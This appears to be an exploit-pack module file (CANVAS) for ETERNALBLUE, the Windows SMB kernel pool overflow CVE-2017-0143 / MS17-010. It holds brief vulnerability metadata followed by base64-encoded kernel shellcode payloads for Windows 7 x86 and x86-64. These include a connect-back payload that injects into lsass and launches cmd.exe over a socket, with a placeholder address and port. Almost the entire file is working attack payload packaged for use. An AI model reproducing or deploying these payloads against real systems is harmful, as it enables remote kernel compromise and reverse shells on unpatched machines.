NAME: ETERNALBLUE
DESCRIPTION: Windows SMB Remote Kernel Pool Overflow
VERSION: '1.0'
EXPLOIT_PACK_NAME: CANVAS

DOCUMENTATION:
  CVE Name: CVE-2017-0143
  CVE Url: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  CVSS: 9.3
  Date public: 03/16/2017
  NOTES: Due to the complexity of the bug, this exploit will never be 100% reliable.
    Please READ THE EXPLOIT SOURCE for more information and notes.
  References: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
  Repeatability: One shot (on failure BSoD might be followed by a reboot, giving opportunity
    to try again)
  VENDOR: Microsoft
  VersionsAffected: ''

PROPERTY:
  ARCH:
  - - Windows
  MSADV: MS17-010
  SITE: Remote
  TYPE: Exploit
  VERSION:
  - '7'

PAYLOADS:
  connect-back-cmd:
    OS: Windows 7
    arch: x86-64
    payload: !!binary |
      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
    tags:
    - name: port
      data: !!binary |
        ur4=
    - name: address
      data: !!binary |
        3q2+7w==
  mosdef-universal:
    x86-64:
      OS: Windows 7
      payload: !!binary |
        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
      tags:
      - name: port
        data: !!binary |
          ur4=
      - name: address
        data: !!binary |
          3q2+7w==
    x86:
      OS: Windows 7
      payload: !!binary |
          VVNXVoPsOOgAAAAAWzHAQGSiJAAAAIHD9P///+hiAwAAhcB0L42TnQQAAInB6PUCAACJwYXJdByNdCQ0iXQkBMcEJAQAAAD/0YPsCIsGiUQkIOsAjYNuBAAAiVwkLIlEJCiJ3ugaAwAAhcB0JY2WgwQAAInBifPoqwIAAInBhcl0EItEJCCJ84kEJP/Rg+wE6wSLRCQgavtZi1QkKIlUJCTrD4TSidgPhIUAAAD/RCQkQYXJdHwPtlQIBYnDjXK/jWogahpYOcaLdCQkD0PqD7Y2jX6/OceNRiAPQ8Y5xXTCK1wkIIH7OAQAAHQguYgBAACB++ACAAB0GIH7bAEAAA+FCgIAALm4AAAA6wW5OAIAAItEJCCLXCQsiwQIKcg5RCQ0iUQkIA+FNf///+neAQAAg3wkIAAPhNMBAACLXCQs6D0CAACFwLkAAAAAdCSNk7gEAACJwejLAQAAhcC5AAAAAHQOi0wkIIkMJP/Qg+wEicGLRCQgiUwkKIt4LI2D/QQAAIlEJCCNg3QEAACJRCQwiXwkJOlrAQAAO3wkJA+EawEAAItcJCyNtyD+///ozwEAADHthcB0G42TxwQAAInB6GABAACFwHQKiTQk/9CD7ASJxTtsJCi4AAAAAA9F8OidAQAAhcAPhBgBAACLVCQgicHoLgEAAIXAD4QFAQAAiTQk/9CD7ASFwA+E9QAAAOhtAQAAhcAPhOgAAACLVCQwicHo/gAAAIXAD4TVAAAAx0QkBDAAAACDJCQA/9CD7AiJxYXtD4S6AAAA6DIBAACFwA+ErQAAAI2T3AQAAInB6MEAAACFwA+EmAAAAItMJEyNk6cDAACJTCQciUwkFIlUJAyJdCQEiSwkx0QkGAEAAACDZCQQAINkJAgA/9CD7CDo3AAAAIXAdFKNk+wEAACJwehvAAAAicGFyXQ/uAIAAABkoiQAAACLRCRQiUQkCItEJEyJRCQEiSwkg2QkDAD/0YPsEInBMcBAZKIkAAAAhMl0EYB+VgF1C+sdMcBAZKIkAAAAiz+F/w+Fi/7//zHAg8Q4Xl9bXcO4AgAAAGSiJAAAAOvpVVNXVlCJFCQx/4tBPIt0AXiLVDEY6x6LRDEgiywkAciLBLgByOsGhNt0DkBFihg6XQB080c513LeMcA513QVi0QxJItUMRwByAHKD7cEeAMMgonIg8QEXl9bXcNqHFhkiwCLSDi4APD//yNBBOsFBQDw//+AOE119oB4AVp18MNTVoPsIItEJDy5ACAAAIt0JDDoAAAAAFuBw0L8//8DCINkJBgAiUwkHOiu////hcB0Q42TVgQAAInB6EH///+FwHQyjUwkHI1UJBiJTCQMiVQkBMdEJBRAAAAAx0QkEAAQAACDZCQIAIMMJP//0IPsGIXAdAuDJgCDxCBeW8IUAItUJDiLTCQYuAAgAAABwYsSK0QkHOsHihpCQIgZQYXAdfW4ACAAAANEJBiJBuvJWndBbGxvY2F0ZVZpcnR1YWxNZW1vcnkAbHNhc3MARXhBbGxvY2F0ZVBvb2wAUHNHZXRQcm9jZXNzSW1hZ2VGaWxlTmFtZQBQc0xvb2t1cFByb2Nlc3NCeVByb2Nlc3NJZABQc0dldFByb2Nlc3NJZABQc0dldFRocmVhZFByb2Nlc3NJZABLZUluaXRpYWxpemVBcGMAS2VJbnNlcnRRdWV1ZUFwYwBQc0dldFRocmVhZFRlYgA=
      tags:
      - name: port
        data: !!binary |
          ur4=
      - name: address
        data: !!binary |
          3q2+7w==
